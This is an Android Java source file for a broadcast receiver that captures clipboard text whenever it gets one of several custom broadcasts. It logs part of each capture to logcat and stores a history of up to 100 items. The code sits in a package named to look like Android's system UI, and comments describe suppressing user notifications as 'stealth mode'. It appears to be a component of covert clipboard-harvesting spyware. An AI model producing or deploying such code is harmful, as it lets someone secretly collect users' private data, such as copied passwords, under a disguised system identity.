package com.android.systemui.helper;

import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.util.ArrayList;
import java.util.List;

public class ClipboardCaptureReceiver extends BroadcastReceiver {
    private static final String TAG = "ClipboardCapture";
    private static final String PREFS_NAME = "clipboard_prefs";
    private static final String HISTORY_KEY = "clipboard_history";
    private static final int MAX_HISTORY_SIZE = 100;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "onReceive called with action: " + action);
        
        // Debug logging only (stealth mode)
        // Toast.makeText(context, "Broadcast received: " + action, Toast.LENGTH_SHORT).show();
        
        // Support multiple action names
        if ("com.android.systemui.helper.SYNC".equals(action) ||  
            "com.android.systemui.helper.CAPTURE".equals(action) ||
            "com.android.systemui.helper.CLIPBOARD_ACTION".equals(action)) {
            
            Log.d(TAG, "Processing clipboard capture for: " + action);
            // Stealth mode - no toast
            // Toast.makeText(context, "Attempting clipboard capture...", Toast.LENGTH_SHORT).show();
            captureClipboard(context);
        }
    }
    
    private void captureClipboard(Context context) {
        try {
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            
            // Try normal clipboard access first
            boolean capturedNormally = false;
            
            try {
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData != null && clipData.getItemCount() > 0) {
                        ClipData.Item item = clipData.getItemAt(0);
                        CharSequence text = item.getText();
                        
                        if (text != null && text.length() > 0) {
                            String clipboardText = text.toString();
                            // Clean up the text - remove null characters and normalize
                            clipboardText = clipboardText.replaceAll("\\x00", "").trim();
                            
                            if (!clipboardText.isEmpty()) {
                                saveToHistory(context, clipboardText, "Broadcast Capture");
                                Log.d(TAG, "Captured via broadcast: " + clipboardText.replaceAll("\\n", "\\\\n").substring(0, Math.min(clipboardText.length(), 50)));
                                capturedNormally = true;
                                return;
                            }
                        }
                    }
                }
            } catch (SecurityException e) {
                Log.d(TAG, "Security exception accessing clipboard (Android 10+ restriction when app closed)");
                capturedNormally = false;
            }
            
            // Only try shell fallback if normal access failed
            if (!capturedNormally) {
                Log.d(TAG, "Normal clipboard access failed, cannot capture when app is closed (Android 10+ restriction)");
                // Don't use shell fallback as it produces gibberish
                // The clipboard cannot be accessed when the app is closed on Android 10+
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing clipboard", e);
        }
    }
    
    private void saveToHistory(Context context, String content, String source) {
        // Log the content safely, escaping newlines
        String logContent = content.replaceAll("\\n", "\\\\n").substring(0, Math.min(content.length(), 50));
        Log.d(TAG, "saveToHistory called with content: " + logContent + " (length: " + content.length() + ")");
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        Gson gson = new Gson();
        
        // Load existing history
        String historyJson = prefs.getString(HISTORY_KEY, "[]");
        List<ClipboardManagerActivity.ClipboardItem> history = gson.fromJson(
            historyJson, 
            new TypeToken<List<ClipboardManagerActivity.ClipboardItem>>(){}.getType()
        );
        
        if (history == null) {
            history = new ArrayList<>();
        }
        
        // Check if already exists
        for (ClipboardManagerActivity.ClipboardItem item : history) {
            if (item.content.equals(content)) {
                // Move to top
                history.remove(item);
                item.timestamp = System.currentTimeMillis();
                history.add(0, item);
                
                // Save and broadcast update
                String updatedJson = gson.toJson(history);
                prefs.edit().putString(HISTORY_KEY, updatedJson).apply();
                Log.d(TAG, "Updated existing item in history - timestamp: " + item.timestamp);
                
                // Notify UI if open - broadcast only, no activity start
                Intent updateIntent = new Intent("com.android.systemui.helper.CLIPBOARD_UPDATE");
                updateIntent.setPackage(context.getPackageName());
                context.sendBroadcast(updateIntent);
                Log.d(TAG, "Sent CLIPBOARD_UPDATE broadcast (existing item)");
                return;
            }
        }
        
        // Add new item
        ClipboardManagerActivity.ClipboardItem newItem = new ClipboardManagerActivity.ClipboardItem(
            content,
            System.currentTimeMillis(),
            source
        );
        history.add(0, newItem);
        
        // Limit size
        while (history.size() > MAX_HISTORY_SIZE) {
            history.remove(history.size() - 1);
        }
        
        // Save updated history
        String updatedJson = gson.toJson(history);
        prefs.edit().putString(HISTORY_KEY, updatedJson).apply();
        
        // Notify UI if open - send broadcast to update the UI
        Intent updateIntent = new Intent("com.android.systemui.helper.CLIPBOARD_UPDATE");
        updateIntent.setPackage(context.getPackageName());
        context.sendBroadcast(updateIntent);
        Log.d(TAG, "Sent CLIPBOARD_UPDATE broadcast to refresh UI");
        
        // Don't start activity - just let the broadcast update the existing one
    }
}